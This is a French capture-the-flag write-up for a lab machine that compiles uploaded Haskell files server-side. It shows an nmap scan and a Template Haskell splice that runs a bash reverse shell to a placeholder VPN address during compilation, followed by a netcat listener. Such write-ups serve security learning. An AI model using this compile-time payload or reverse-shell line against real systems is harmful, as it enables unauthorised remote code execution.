# Fun with Functional

## Contexte
- **Nom du challenge** : Fun with Functional
- **Catégorie** : Injection
- **Difficulté** : Easy
- **Objectif** : obtenir un accès sur la machine et lire `user.txt`.

---

## 1. Reconnaissance

Scan complet des ports avec détection de services :

```bash
nmap -sV -sC -p- <IP>
```

```
22/tcp   open  ssh            OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
5001/tcp open  commplex-link?
```

Le service sur le port **5001** affiche :

```
Why bother yourself with security when you can code in Haskell? Yay!
```

avec un lien vers **`/homework`**.

---

## 2. Analyse de la page `/homework` (le piège)

La page `/homework` propose d'**uploader un fichier `.hs` (Haskell)** censé afficher
`I love Haskell`, "corrigé" par un outil automatique.

En réalité, le serveur **compile le fichier avec GHC côté serveur** et expose les logs de
compilation via `/uploads/<fichier>.hs`.

**Vulnérabilité** : compiler du code fourni par l'utilisateur est aussi dangereux que
l'exécuter — avec **Template Haskell**, du code peut s'exécuter **pendant la compilation
elle-même**, sans jamais lancer le binaire compilé.

---

## 3. Exploitation — Template Haskell

Un splice `$( ... )` avec `runIO` permet d'exécuter du code Haskell (donc des commandes
système) **pendant la compilation**. On l'utilise pour déclencher un reverse shell :

```haskell
{-# LANGUAGE TemplateHaskell #-}
module Main where

import System.Process
import Language.Haskell.TH
import Language.Haskell.TH.Syntax (runIO)

$(do
    runIO (createProcess (proc "bash" ["-c", "bash -i >& /dev/tcp/<VPN_IP>/4444 0>&1 &"]))
    return [])

main :: IO ()
main = return ()
```

On met un listener en place côté attaquant :

```bash
nc -lvnp 4444
```

Puis on **uploade le fichier `.hs`** : dès que le serveur le compile avec GHC, le splice
`runIO` s'exécute et le reverse shell se connecte → **RCE confirmée**.

---

## 4. Reverse shell

Une fois le payload  uploadé et le listener en place, la RCE fonctionne : on obtient
un shell sur la machine et l'accès à `user.txt`.

```bash
cat user.txt
```

→ **flag `user.txt` obtenu**.

---

## Récapitulatif de la chaîne d'attaque

| Étape | Vecteur exploité |
|-------|------------------|
| 1 | Découverte du service web sur le port 5001 → page `/homework` |
| 2 | Upload de `.hs` compilé côté serveur avec GHC (les logs sont exposés) |
| 3 | Template Haskell (`$(runIO ...)`) → exécution pendant la compilation → reverse shell |
| 4 | Shell sur la machine → `user.txt` |

---

## Outils utilisés
- `nmap` — scan des ports et détection de services
- `curl` / navigateur — interaction avec le service web
- `ghc` / Template Haskell — exécution de code à la compilation (côté serveur)
- `nc` (netcat) — listener du reverse shell

## Techniques utilisées
- **Énumération** de ports et services (nmap)
- Exploitation d'une **compilation de code non fiable côté serveur**
- **RCE via Template Haskell** (`$( runIO ... )` — exécution à la compilation)
- **Reverse shell** (`bash -i >& /dev/tcp/...`)
- **Débogage réseau** (bonne interface VPN `tun0`)
